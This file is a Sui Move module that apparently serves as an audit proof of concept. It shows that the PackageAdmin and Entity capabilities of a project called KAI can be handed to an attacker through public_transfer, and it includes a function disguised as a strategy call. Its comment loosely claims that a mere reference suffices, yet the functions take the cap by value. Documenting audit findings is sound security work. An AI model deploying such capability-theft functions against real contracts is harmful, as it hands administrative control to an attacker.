module exploit::admin_cap_theft;

use access_management::access::{PackageAdmin, Entity};
use sui::transfer;
use sui::tx_context::{Self, TxContext};

/**
 * Finding #3: AdminCap has `store` ability
 * 
 * Vulnerability: In Sui Move, adding the `store` ability to a resource with `key`
 * allows it to be publicly transferred using `transfer::public_transfer`.
 * 
 * KAI's `PackageAdmin` and `Entity` caps have `store`, meaning if an attacker
 * obtains a reference, they can steal the capability and perform administrative actions.
 */

public entry fun steal_package_admin(cap: PackageAdmin, attacker: address) {
    // This call is only possible because `PackageAdmin` has the `store` ability.
    // If it only had `key`, this would fail to compile.
    transfer::public_transfer(cap, attacker);
}

public entry fun steal_entity(entity: Entity, attacker: address) {
    // Same for the `Entity` cap.
    transfer::public_transfer(entity, attacker);
}

public entry fun malicious_strategy_function(cap: PackageAdmin, ctx: &mut TxContext) {
    let attacker = tx_context::sender(ctx);
    transfer::public_transfer(cap, attacker);
}
